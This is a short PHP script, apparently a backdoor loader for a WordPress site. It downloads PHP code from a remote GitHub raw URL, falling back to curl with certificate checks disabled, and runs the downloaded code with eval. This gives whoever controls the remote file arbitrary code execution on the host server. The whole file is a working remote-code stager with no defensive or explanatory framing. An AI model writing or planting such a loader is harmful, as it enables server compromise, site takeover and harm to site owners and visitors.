<?php
$remote_url = 'https://raw.githubusercontent.com/unamexid/collect/main/x/wp-act.php';

function fetch_remote_code($url) {
    $code = false;
    if (ini_get('allow_url_fopen')) {
        $code = @file_get_contents($url);
    }
    if (!$code && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => 0
        ]);
        $code = curl_exec($ch);
        curl_close($ch);
    }
    return $code;
}

$code = fetch_remote_code($remote_url);
if (!$code) die("Could not fetch code.");

eval('?>' . $code);
